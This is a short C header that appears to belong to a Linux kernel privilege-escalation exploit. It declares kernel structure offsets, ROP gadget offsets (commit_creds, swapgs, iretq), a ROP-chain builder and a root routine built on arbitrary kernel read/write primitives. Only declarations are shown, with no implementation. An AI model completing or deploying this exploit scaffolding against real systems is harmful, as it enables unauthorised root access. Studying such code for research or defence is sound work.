/* -------------- ARBITRARY KERNEL READ/WRITE ------------------ */


extern off_t INIT_TASK;
extern off_t TASK_LINKS_OFFSET;
extern off_t TASK_PID_OFFSET;
extern off_t TASK_THREADPID_OFFSET;
extern off_t PID_NUMBERS_OFFSET;
extern off_t TASK_CRED_OFFSET;

extern off_t CRED_USERNS_OFFSET;
extern off_t INIT_USER_NS;
extern off_t TASK_FS_OFFSET;
extern off_t INIT_FS;

extern off_t KERNEL_CRED_OFF;
extern off_t COMMIT_CRED_OFF;
extern off_t POP_RDI_OFF;
extern off_t POP_RSI_OFF;
extern off_t SWAPGS_OFF;
extern off_t IRETQ_OFF;

int root_arbrw8(uintptr_t kernbase, uint64_t(*arbread)(uintptr_t kptr), int (*arbwrite)(uintptr_t kptr, uint64_t value));

void build_ropchain(uint64_t kbase, uint64_t *rop_ptr);

extern unsigned long user_eip;
extern unsigned long user_cs;
extern unsigned long user_eflags;
extern unsigned long user_sp;
extern unsigned long user_ss;
